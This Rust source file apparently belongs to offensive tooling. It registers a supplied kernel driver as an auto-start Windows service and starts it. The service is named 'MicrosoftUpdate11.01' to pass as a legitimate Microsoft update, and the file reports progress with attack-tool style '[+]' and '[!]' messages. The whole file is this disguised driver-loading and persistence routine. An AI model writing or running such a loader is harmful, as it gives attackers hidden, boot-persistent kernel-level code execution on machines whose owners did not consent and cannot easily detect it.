use anyhow::{Result, Context, bail};
use std::path::{Path, PathBuf};
use std::ffi::OsString;
use windows_service::{
    service::{ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType},
    service_manager::{ServiceManager, ServiceManagerAccess},
};
use windows_service::service::ServiceState;
use std::ffi::OsStr;

pub fn register_kernel_service(driver_path: PathBuf) -> Result<()> {
    
    let service_name = "MicrosoftUpdate11.01";
    // Connect to the service manager
    let manager = ServiceManager::local_computer(None::<OsString>, ServiceManagerAccess::CREATE_SERVICE)
        .context("Failed to connect to service manager")?;

    // Service infos
    let service_info = ServiceInfo {

        name         : OsString::from(service_name),
        display_name : OsString::from(service_name),
        service_type : ServiceType::KERNEL_DRIVER,
        start_type   : ServiceStartType::AutoStart,
        error_control: ServiceErrorControl::Normal,
        executable_path : driver_path,
        launch_arguments: vec![], 
        dependencies    : vec![],
        account_name    : None,
        account_password: None,
    };


    // Open the service with START and QUERY_STATUS access rights
    let service_access = ServiceAccess::QUERY_STATUS | ServiceAccess::START;
    let service = manager.open_service(service_name, service_access).context("[!] Failed to open the service!");

    let exists = service_exists(service_name)?;
    if exists {
        println!("[+] Starting service '{}'", service_name);
    } else {

        println!("[+] Creating 'MicrosoftUpdate11.01' service ...");
        let service = manager.create_service(&service_info, service_access)
                .context("[!] Failed to create service {service_name}")?; 
    };
       
    match start_kernel_service(service_name) {
        Ok(true) => println!("[*] Service {service_name} started"),
        Ok(false) => bail!("[!] Failed to start service: {service_name}"),
        Err(e) => {bail!("[?] Error: {}", e);},
    };
    
    Ok(())
}

fn start_kernel_service(service_name: &str) -> Result<bool> {

    let manager = match ServiceManager::local_computer(None::<OsString>, ServiceManagerAccess::CONNECT | ServiceManagerAccess::CREATE_SERVICE){
        Ok(manager) => manager,
        Err(e) => {bail!("Failed to connect to Service Control Manager: {:?}", e);},
        
    };
    let service_access = ServiceAccess::QUERY_STATUS | ServiceAccess::START;
    let service = manager.open_service(service_name, service_access).context("[!] Failed to open the service!");

    match service {
        Ok(service) =>{
            let status = service.query_status()?;
            match status.current_state {
                ServiceState::Running => {
                    return Ok(true);
                },
                ServiceState::Stopped => {
                    println!("[!] Service '{}' is stopped. Starting...", service_name);
                    service.start(&[] as &[&OsStr])?;
                    return Ok(true);
                },
                _ => {
                    println!("[?] Service '{}' is in state: {:?}", service_name, status.current_state);
                }
            }
        },
        Err(e) => {
            return Ok(false);
        }
    }

    bail!("[] Failed to start service '{}'", service_name);
}

fn service_exists(service_name: &str) -> Result<bool> {

    let manager = ServiceManager::local_computer(
        None::<OsString>, 
        ServiceManagerAccess::CONNECT
    ).context("Failed to connect to service manager")?;
    
    match manager.open_service(service_name, ServiceAccess::QUERY_STATUS) {
        Ok(_) => {return Ok(true);},
        Err(windows_service::Error::Winapi(e)) if e.raw_os_error() == Some(1060) => {return Ok(false);},
        Err(e) => {bail!("{}",e);},
    }
}   